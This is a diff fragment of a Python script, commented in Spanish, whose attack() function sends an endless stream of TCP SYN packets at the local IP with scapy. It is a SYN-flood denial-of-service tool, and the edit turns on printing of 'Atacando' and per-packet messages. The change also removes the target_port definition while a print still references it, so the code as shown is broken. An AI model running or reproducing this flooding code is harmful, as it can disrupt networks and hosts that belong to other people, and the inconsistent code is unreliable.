@@ -26,9 +26,7 @@ def attack():
     try:
         # Obtener la IP local de la red
         target_ip = get_local_ip()
-        target_port = 80  # Puerto objetivo (ajústalo si tienes un servidor en otro puerto)
-
-        #print(f"Atacando: {target_ip}:{target_port}")
+        print(f"Atacando: {target_ip}")
 
         while True:
             packet_count = 0
@@ -53,7 +51,7 @@ def attack():
 
                 # Enviar el paquete
                 send(packet, verbose=False)
-                #print(f"Paquete TCP SYN enviado a {target_ip}:{target_port} desde {src_ip}:{src_port}")
+                print(f"Paquete TCP SYN enviado a {target_ip}:{target_port} desde {src_ip}:{src_port}")
                 packet_count += 1
                 """
                 if packet_count % 200 == 0:
